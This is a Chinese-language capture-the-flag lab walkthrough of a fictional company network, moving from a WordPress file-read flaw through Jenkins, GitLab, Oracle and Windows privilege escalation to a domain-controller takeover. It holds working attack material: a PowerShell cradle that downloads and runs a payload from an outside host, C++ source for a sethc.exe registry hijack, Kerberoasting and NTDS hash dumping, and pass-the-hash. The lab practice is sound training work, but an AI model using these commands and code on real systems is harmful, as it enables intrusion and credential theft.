**靶标介绍：**  
在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入
XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个
Flag，分布于不同的靶机。  
![a](https://image.3001.net/images/20230714/1689344794_64b15b1a23463007a0cde.png!small)

开局一个IP

    
    
    39.xx.xx.xx
    

扫描结果

    
    
    start infoscan
    (icmp) Target 39.98.116.174   is alive
    [*] Icmp alive hosts len is: 1
    39.98.116.174:80 open
    39.98.116.174:3306 open
    39.98.116.174:8080 open
    39.98.116.174:3389 open
    [*] alive ports len is: 4
    start vulscan
    [*] WebTitle: http://39.98.116.174:8080 code:403 len:548    title:None
    [*] WebTitle: http://39.98.116.174      code:200 len:54689  title:XR SHOP
    

80端口一个 Wordpress  
8080一个 Jenkins  
80端口扫到一个备份文件`www.zip`  
在源码里面找到了数据库连接口令  
![a](https://image.3001.net/images/20230714/1689344794_64b15b1ae0f7f32699975.png!small)

    
    
    define( 'DB_USER', 'root' );
    
    /** Database password */
    define( 'DB_PASSWORD', '3%I$A*gl&9^b#' );
    

在tools目录下  
发现两个文件  
![a](https://image.3001.net/images/20230714/1689344795_64b15b1b9051bb69f9095.png!small)

  * content-log.php

    
    
    任意文件读取
    <?php
    $logfile = rawurldecode( $_GET['logfile'] );
    // Make sure the file is exist.
    if ( file_exists( $logfile ) ) {
      // Get the content and echo it.
      $text = file_get_contents( $logfile );
      echo( $text );
    }
    exit;
    
    

  * phpinfo.php

    
    
    <?php phpinfo();?>
    

这下子可以尝试利用这个content-log.php去读取本机文件了  
有Jenkins  
`JENKINS_HOME`目录中的 `/secrets/initialAdminPassword`文件明文保存着 admin 用户的密码  
Jenkins 配置目录为 C:\ProgramData\Jenkins\\.jenkins 题目已经给出

    
    
    /tools/content-log.php?logfile=C:\\ProgramData\\Jenkins\\.jenkins\\secrets\\initialAdminPassword
    

成功的读到了admin的pass

    
    
    510235cf43f14e83b88a9f144199655b
    

![a](https://image.3001.net/images/20230714/1689344796_64b15b1c488215f0af38b.png!small)  
访问`/script`执行脚本

    
    
    println("whoami".execute().text)
    

![a](https://image.3001.net/images/20230714/1689344796_64b15b1cec573c559fc2b.png!small)

直接用cs生成powershell上线或者可以写webshell到wordpress  
生成的

    
    
    powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('http://175.xx.xx.xx:61808/a'))"
    

在此网站上编码[https://r0yanx.com/tools/java_exec_encode](https://r0yanx.com/tools/java_exec_encode/)主要是为了防止因为引号问题导致命令无法正常执行

    
    
    powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcANQAuAHgAeAAuAHgAeAAuAHgAeAA6ADYAMQA4ADAAOAAvAGEAJwApACkAIgA=
    

![a](https://image.3001.net/images/20230714/1689344797_64b15b1d84f679a3379ed.png!small)  
直接获得一个system权限，这是非常不错的  
先拿第一个flag  
![a](https://image.3001.net/images/20230714/1689344798_64b15b1e1c96ccbd56307.png!small)

    
    
    flag01: flag{143867e5-4318-477e-a7fb-27a0587d3125}
    

在jenkins获取到gitlab api，但是 这个是经过加密的

    
    
    C:\ProgramData\Jenkins\.jenkins\credentials.xml
    
    com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl plugin="gitlab-plugin@1.6.0">
              <scope>GLOBAL</scope>
              <id>9eca4a05-e058-4810-b952-bd6443e6d9a8</id>
              <description></description>
              <apiToken>{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}</apiToken>
            </com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl>
    

紧接着扫描下内网，看看这个gitlab在哪里  
upload下fscan 然后在cs开启下socks 服务

    
    
    (icmp) Target 172.22.14.7     is alive
    (icmp) Target 172.22.14.11    is alive
    (icmp) Target 172.22.14.16    is alive
    (icmp) Target 172.22.14.31    is alive
    (icmp) Target 172.22.14.46    is alive
    [*] Icmp alive hosts len is: 5
    172.22.14.11:135 open
    172.22.14.7:135 open
    172.22.14.46:80 open
    172.22.14.16:80 open
    172.22.14.7:80 open
    172.22.14.16:22 open
    172.22.14.16:8060 open
    172.22.14.46:3389 open
    172.22.14.31:3389 open
    172.22.14.11:3389 open
    172.22.14.7:3389 open
    172.22.14.7:3306 open
    172.22.14.31:1521 open
    172.22.14.46:445 open
    172.22.14.31:445 open
    172.22.14.11:445 open
    172.22.14.7:445 open
    172.22.14.46:139 open
    172.22.14.31:139 open
    172.22.14.11:139 open
    172.22.14.46:135 open
    172.22.14.31:135 open
    172.22.14.7:139 open
    172.22.14.11:88 open
    172.22.14.7:8080 open
    172.22.14.16:9094 open
    [*] alive ports len is: 26
    start vulscan
    [+] NetInfo:
    [*]172.22.14.11
       [->]XR-DC
       [->]172.22.14.11
    [+] NetInfo:
    [*]172.22.14.7
       [->]XR-JENKINS
       [->]172.22.14.7
    [*] WebTitle: http://172.22.14.7        code:200 len:54603  title:XR SHOP
    [+] NetInfo:
    [*]172.22.14.46
       [->]XR-0923
       [->]172.22.14.46
    [+] NetInfo:
    [*]172.22.14.31
       [->]XR-ORACLE
       [->]172.22.14.31
    [*] 172.22.14.46         XIAORANG\XR-0923           
    [*] WebTitle: http://172.22.14.16       code:302 len:99     title:None GitLab url: http://172.22.14.16/users/sign_in
    [*] WebTitle: http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
    [*] WebTitle: http://172.22.14.46       code:200 len:703    title:IIS Windows Server
    [*] 172.22.14.11   [+]DC XIAORANG\XR-DC             
    [*] 172.22.14.31         WORKGROUP\XR-ORACLE         
    [*] WebTitle: http://172.22.14.7:8080   code:403 len:548    title:None
    [*] WebTitle: http://172.22.14.16/users/sign_in code:200 len:32807  title:Sign in GitLab
    

找到了gitlab的位置  
但是还是没办法连过去，因为我们不知道api  
这里有个简单的办法获取明文api  
访问

    
    
    /manage/configure
    

这下面有个测试gitlab连接的功能  
![a](https://image.3001.net/images/20230714/1689344798_64b15b1ec994220b15ba1.png!small)

url设置成监听的地址  
![a](https://image.3001.net/images/20230714/1689344799_64b15b1fa527fd8d1ea74.png!small)  
即可成功的获取到明文的api

    
    
    PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2
    

拿到TOKEN之后我们就可以遍历他的项目  
首先访问

    
    
    获取所有项目地址
    curl --silent --header "PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2"  "http://172.22.14.16/api/v4/projects/" | jq | grep "http_url_to_repo"
    

![a](https://image.3001.net/images/20230714/1689344800_64b15b207e35e26b6f983.png!small)  
这http://后面的全是用户名  
然后我们在通过以下命令来把这些项目全下载到本地

    
    
    git -C ./code/ clone  http://$USERNAME:$TOKEN@$IP/$PROJ_PATH
    git -C ./code/ clone  http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/gitlab-instance-23352f48/Monitoring.git
    git -C ./code/ clone  http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git
    git -C ./code/ clone  http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git
    git -C ./code/ clone  http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git
    git -C ./code/ clone  http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git
    gitlab.xiaorang.lab 是URL 中的用户名
    

git 完成之后就开始看源码  
在`xradmin\ruoyi-admin\src\main\resources\application-druid.yml`中发现oracle的用户名和密码

    
    
    master:
    	url: jdbc:oracle:thin:@172.22.14.31:1521/orcl
    	username: xradmin
    	password: fcMyE8t9E4XdsKf
    

使用sqlplus连接(本地搭了代理还是不好连接,建议传个到靶机上去用)

    
    
    sqlplus.exe xradmin/fcMyE8t9E4XdsKf@//172.22.14.31:1521/orcl as sysdba      --管理员用户使用tns别名登陆
    

创建java函数提权  
赋权

    
    
    begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;  
    /  
    

创建java代码

    
    
    create or replace and compile java source named exe_linux as  
    import java.io.BufferedReader;  
    import java.io.InputStream;  
    import java.io.InputStreamReader;  
    import java.net.UnknownHostException;  
    public class Test  
    {  
    public static String list_cmd(String str){  
        Runtime runtime=Runtime.getRuntime();  
      StringBuffer enco = new StringBuffer();  
      enco.append("GBK");  
      try{  
      Process proc =runtime.exec(str);  
      InputStream inp_suc=proc.getInputStream();  
      InputStream inp_err=proc.getErrorStream();  
      BufferedReader bfr_err = new BufferedReader(new InputStreamReader(inp_err,enco.toString()));  
      BufferedReader bfr_suc = new BufferedReader(new InputStreamReader(inp_suc,enco.toString()));  
        String strLine;  
          while( (strLine=(bfr_suc.readLine())) != null){  
           
          System.out.println(strLine);  
              }  
      while( (strLine=(bfr_err.readLine())) != null){  
           
        System.out.println(strLine);  
        }  
            proc.destroy();  
            inp_suc.close();  
            inp_err.close();  
        }catch (Exception e) {  
          System.out.println("EXECUTE IS ERROR!");  
          System.out.println(e.getMessage());  
        }  
        return "";  
      }  
           
      /* public static void main(String[] args){  
           
          list_cmd(args[0]);  
        }  
        **/  
    }  
      
    /
    

创建存储过程

    
    
    create or replace procedure p_exe_linux(str varchar2) as language java  
    name 'Test.list_cmd(java.lang.String)';  
    /  
    

命令执行

    
    
    EXEC P_EXE_LINUX('whoami');
    

![a](https://image.3001.net/images/20230714/1689344801_64b15b2124b655be03990.png!small)  
命令执行全程无回显  
修改个管理员直接远程上去了  
![a](https://image.3001.net/images/20230714/1689344801_64b15b21b58d0bd9b287e.png!small)

    
    
    flag02: flag{0dff53a9-df67-457a-8115-48a8a973ed48}
    

在 **internal-secret** 中发现了一些user和pass  
这个是能直接登录的

    
    
    XR-0923 | zhangshuai | wSbEajHzZs
    

![a](https://image.3001.net/images/20230714/1689344802_64b15b22595bad9a3cbef.png!small)  
这台是在域内，当前是主机账号  
想办法提权到system获取域内权限  
提权知识点  
 **SeRestorePrivilege**  
修改注册表`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
Options`劫持sethc.exe启动  
首先我们`whoami /priv`查看到是不存在SeRestorePrivilege的  
![a](https://image.3001.net/images/20230714/1689344802_64b15b22f023b8dea914b.png!small)  
这个时候需要绕过UAC，获得特权  
目标开了5985 直接用winrm即可

    
    
    evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs
    

成功的获得了 SeRestorePrivilege  
![a](https://image.3001.net/images/20230714/1689344803_64b15b239bb697b3cd023.png!small)  
然后就可以修改注册表劫持sethc.exe提权了  
需要自己编译下

    
    
    /*
    Reference:https://github.com/hatRiot/token-priv
    Enable the SeRestorePrivilege of current process and then create a reg key at HKEY_LOCAL_MACHINE\SOFTWARE\testrestore.
    
    We will have write access on the system.
    */
    
    #include <windows.h>
    #include <assert.h>
    #pragma comment(lib,"advapi32.lib") 
    #pragma comment(lib,"user32.lib") 
    #include <tchar.h> 
    #include <string>
    
    using  std::string;
    void se_restore_priv()
    {
    	DWORD sID;
    	ProcessIdToSessionId(GetCurrentProcessId(), &sID);
    	std::string data = "\"C:\\Windows\\System32\\cmd.exe\"";
    
    	HKEY handle;
    	LSTATUS stat = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
    		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
    		0,
    		NULL,
    		REG_OPTION_BACKUP_RESTORE,
    		KEY_SET_VALUE,
    		NULL,
    		&handle,
    		NULL);
    
    	if (stat != ERROR_SUCCESS) {
    		printf("[-] Failed opening key! %d\n", stat);
    		return;
    	}
    
    	stat = RegSetValueExA(handle, "Debugger", 0, REG_SZ, (const BYTE*)data.c_str(), data.length() + 1);
    	if (stat != ERROR_SUCCESS) {
    		printf("[-] Failed writing key! %d\n", stat);
    		return;
    	}
    
    	printf("[+] Key set");
    	RegCloseKey(handle);
    	return;
    }
    
    
    int IsTokenSystem(HANDLE tok)
    {
    	DWORD Size, UserSize, DomainSize;
    	SID* sid;
    	SID_NAME_USE SidType;
    	TCHAR UserName[64], DomainName[64];
    	TOKEN_USER* User;
    	Size = 0;
    	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
    	if (!Size)
    		return 0;
    
    	User = (TOKEN_USER*)malloc(Size);
    	assert(User);
    	GetTokenInformation(tok, TokenUser, User, Size, &Size);
    	assert(Size);
    	Size = GetLengthSid(User->User.Sid);
    	assert(Size);
    	sid = (SID*)malloc(Size);
    	assert(sid);
    
    	CopySid(Size, sid, User->User.Sid);
    	UserSize = (sizeof UserName / sizeof * UserName) - 1;
    	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
    	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
    	free(sid);
    
    	printf("whoami:\n%S\\%S\n", DomainName, UserName);
    	if (!_wcsicmp(UserName, L"SYSTEM"))
    		return 0;
    	return 1;
    }
    
    VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
    {
    	UINT len = 0;
    	if (attributes & SE_PRIVILEGE_ENABLED)
    		len += wsprintf(szAttrbutes, TEXT("Enabled"));
    	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
    		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
    	if (attributes & SE_PRIVILEGE_REMOVED)
    		len += wsprintf(szAttrbutes, TEXT("Removed"));
    	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
    		len += wsprintf(szAttrbutes, TEXT("Used for access"));
    	if (szAttrbutes[0] == 0)
    		wsprintf(szAttrbutes, TEXT("Disabled"));
    	return;
    }
    
    int GetTokenPrivilege(HANDLE tok)
    {
    	PTOKEN_PRIVILEGES ppriv = NULL;
    	DWORD dwRet = 0;
    	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
    	if (!dwRet)
    		return 0;
    	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
    	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
    	printf("\nwhoami /priv\n");
    	for (unsigned int i = 0; i < ppriv->PrivilegeCount; i++)
    	{
    		TCHAR lpszPriv[MAX_PATH] = { 0 };
    		DWORD dwRet = MAX_PATH;
    		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
    		printf("%-50ws", lpszPriv);
    		TCHAR lpszAttrbutes[1024] = { 0 };
    		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
    		printf("%ws\n", lpszAttrbutes);
    	}
    	return 1;
    }
    
    BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
    {
    
    	TOKEN_PRIVILEGES tp;
    	LUID luid;
    
    	if (!LookupPrivilegeValue(NULL, priv, &luid))
    	{
    		printf("[!]LookupPrivilegeValue error\n");
    		return 0;
    	}
    	tp.PrivilegeCount = 1;
    	tp.Privileges[0].Luid = luid;
    	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    	{
    		printf("[!]AdjustTokenPrivileges error\n");
    		return 0;
    	}
    
    	IsTokenSystem(hToken);
    	GetTokenPrivilege(hToken);
    
    	return TRUE;
    }
    
    int _tmain(int argc, _TCHAR* argv[])
    {
    	HANDLE hToken;
    	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    	{
    		printf("[!]OpenProcessToken error\n");
    		return 0;
    	}
    
    	EnablePriv(hToken, SE_RESTORE_NAME);
    	se_restore_priv();
    	return 0;
    }
    
    

传上去之后在winrm上执行即可写入注册表劫持sethc.exe  
紧接着右键账户锁定桌面  
![a](https://image.3001.net/images/20230714/1689344804_64b15b24370aac78d0fd7.png!small)  
然后在shift 5 下即可获得 **system**  
![a](https://image.3001.net/images/20230714/1689344804_64b15b24cbc9d72187bfb.png!small)  
这整个过程设计的太妙了，提权花的时间有点多，网上也都是非预期，在日志里发现管理员密码，现在打也被修了，最后还是去问了下大佬  
![a](https://image.3001.net/images/20230714/1689344805_64b15b259b430ab372920.png!small)

    
    
    flag03: flag{0faf56a3-1691-4216-9151-27ff2e8d7ec9}
    

这里把它上线msf，操作起来更方便  
用kiwi模块直接导出hash  
![a](https://image.3001.net/images/20230714/1689344806_64b15b2634ba3d98a0f78.png!small)

    
    
    Username    Domain    NTLM                              SHA1
    --------    ------    ----                              ----    XR-0923$    XIAORANG  8519c5a89b2cd4d679a5a36f26863e5d  42d8188bc30ff0880b838e368c6e5522b86f978d
    zhangshuai  XR-0923   f97d5a4b44b11bc257a63c3f76f18a9a  f6ff2714d556240436758527e190e329f05cd43d
    

发现当前的机器账户是在域内的，上传SharpHound分析  
TIANJING 用户是在backup组里，这个组能直接导出域控hash  
![a](https://image.3001.net/images/20230714/1689344806_64b15b26d08e55914a782.png!small)

所以我们下一步要想办法把他的权限给拿下来  
发现SPN  
![a](https://image.3001.net/images/20230714/1689344807_64b15b2769ecea5f725c7.png!small)

    
    
    Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt
    格式也可以是john
    Rubeus.exe kerberoast /format:john /outfile:hash.txt
    

用hashcat爆破

    
    
    hashcat hash.txt -m 13100  rockyou.txt
    

得到密码  
![a](https://image.3001.net/images/20230714/1689344809_64b15b29063c39be7260a.png!small)

    
    
    xiaorang.lab\tianjian DPQSXSXgh2
    

winrm上dc

    
    
    evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2
    

![a](https://image.3001.net/images/20230714/1689344810_64b15b2a00c025d0a8959.png!small)  
利用特权导出hash本地解密  
使用diskshadow.exe 导出ntds.dit和system.hiv  
首先创建个文本 -- 自己测试的时候要把注释删了，不然编码问题会导致不能执行  
像这样  
![a](https://image.3001.net/images/20230714/1689344811_64b15b2be4fc6ee62e6db.png!small)

    
    
    #设置卷影拷贝
    set context persistent nowriters
    #添加卷
    add volume c: alias someAlias
    #创建快照
    create
    #分配虚拟磁盘盘符
    expose %someAlias% k:
    

建立IPC$通道使用copy传文件

    
    
    net use \\172.22.14.7\ipc$ Aa123456 /user:administrator       #Aa123456 自己修改得到
    copy \\172.22.14.7\C$\1.txt  .
    
    
    
    # 复制ntds到当前目录
    RoboCopy /b k:\windows\ntds . ntds.dit
    # 注册表导出system
    reg reg save hklm\system system.save
    # 然后在复制 准备拖到本地解密
    copy system.save \\172.22.14.7\C$\
    copy ntds.dit \\172.22.14.7\C$\
    

成功导出hash

    
    
    impacket-secretsdump  -system system.save -ntds ntds.dit LOCAL
    

![a](https://image.3001.net/images/20230714/1689344812_64b15b2cd52649fdf50d0.png!small)

wmiexec 上去读flag

    
    
    impacket-wmiexec  ./administrator@172.22.14.11 -hashes :70c39b547b7d8adec35ad7c09fb1d277
    

![a](https://image.3001.net/images/20230714/1689344814_64b15b2e284b80a814bc4.png!small)

    
    
    flag04: flag{a459330d-2b2f-4487-8e57-6a38aefcfdcc}
    

